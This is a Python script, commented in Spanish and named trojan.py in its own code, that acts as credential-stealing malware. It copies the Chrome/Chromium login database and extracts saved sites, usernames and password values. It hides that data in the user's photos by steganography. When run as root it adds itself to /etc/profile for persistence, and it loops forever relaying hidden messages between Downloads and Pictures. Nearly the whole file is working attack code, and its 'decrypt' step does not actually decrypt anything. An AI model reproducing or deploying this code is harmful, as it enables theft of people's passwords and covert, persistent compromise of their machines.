import glob
from os import path, geteuid, remove
from PIL import Image
from datetime import datetime, timedelta
import sqlite3 as sql
from shutil import copy
import re
import sys
from time import sleep


# Función que codifica un mensaje en una imagen (esteganografía)
def encode(filepath, message):
    try:
        img = Image.open(filepath)
        # Usar una biblioteca moderna de esteganografía aquí
        # Por ejemplo, con `pysteg` (requiere instalar pysteg: pip install pysteg)
        from pysteg import steg
        stegimg = steg.encode(img, message)
        stegimg.save(filepath, 'PNG')
    except Exception as e:
        print(f"Error al codificar el mensaje: {e}")


# Función que decodifica el mensaje de una imagen
def decode(filepath):
    try:
        img = Image.open(filepath)
        from pysteg import steg
        message = steg.decode(img)
        return message
    except Exception as e:
        print(f"Error al decodificar el mensaje: {e}")
        return None


# Función para formatear mensajes
def format_msg(entry):
    msg = f"{len(entry[2]):02d}{entry[2]}{entry[0]}@{entry[1]}#"
    return msg


# Función para validar el formato de los mensajes
def is_valid_format(msg):
    return bool(re.match(r'^\d{2}.*@.*#$', msg))


# Función para extraer contraseñas almacenadas por navegadores
def decrypt_passwords():
    msg_list = []
    try:
        chrome_path = path.expanduser("~/.config/google-chrome/Default/Login Data")
        if not path.exists(chrome_path):
            chrome_path = path.expanduser("~/.config/chromium/Default/Login Data")
        if not path.exists(chrome_path):
            print("No se encontraron datos de Chrome/Chromium.")
            return []
        
        temp_path = "/tmp/Login Data"
        copy(chrome_path, temp_path)

        db = sql.connect(temp_path)
        cur = db.cursor()
        cur.execute("SELECT origin_url, username_value, password_value FROM logins;")
        rows = cur.fetchall()

        for row in rows:
            entry = [str(row[1]), str(row[0]), str(row[2])]
            msg_list.append(format_msg(entry))
        
        remove(temp_path)
    except Exception as e:
        print(f"Error al descifrar contraseñas: {e}")
    return msg_list


# Función que inicializa la primera ejecución
def first_run():
    try:
        msg_list = decrypt_passwords()
        num_msgs = len(msg_list)

        encode_dir = path.expanduser("~/Pictures/")
        num_files = 0

        if num_msgs > 0:
            for infile in glob.glob(encode_dir + "*.jpg"):
                encode(infile, msg_list[num_files % num_msgs])
                num_files += 1

            # Guardar configuración inicial
            with open("/tmp/bootup.cfg", "w") as f:
                f.write(f"{num_files}\n")
                f.write("1950-01-01 00:00:00")
        
        if geteuid() == 0:
            try:
                with open("/etc/profile", "a") as f:
                    f.write("python3 trojan.py &\n")
            except Exception as e:
                print(f"Error al configurar persistencia: {e}")
    except Exception as e:
        print(f"Error en first_run: {e}")


# Función principal
def main():
    while True:
        if not path.exists("/tmp/bootup.cfg"):
            first_run()
        else:
            try:
                with open("/tmp/bootup.cfg", "r") as f:
                    num_encoded = int(f.readline().strip())
                    update_dt = datetime.strptime(f.readline().strip(), "%Y-%m-%d %H:%M:%S")
            except Exception as e:
                print(f"Error al leer configuración: {e}")
                num_encoded = 0
                update_dt = datetime.min

            # Procesar imágenes
            encode_dir = path.expanduser("~/Pictures/")
            decode_dir = path.expanduser("~/Downloads/")
            msg_list = []

            for infile in glob.glob(decode_dir + "*.png"):
                file_cdt = datetime.fromtimestamp(path.getctime(infile))
                if file_cdt > update_dt:
                    msg = decode(infile)
                    if msg and is_valid_format(msg):
                        msg_list.append(msg)

            if msg_list:
                for infile in glob.glob(encode_dir + "*.jpg"):
                    encode(infile, msg_list[num_encoded % len(msg_list)])
                    num_encoded += 1

                with open("/tmp/bootup.cfg", "w") as f:
                    f.write(f"{num_encoded}\n")
                    f.write(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        
        sleep(10)


if __name__ == "__main__":
    main()
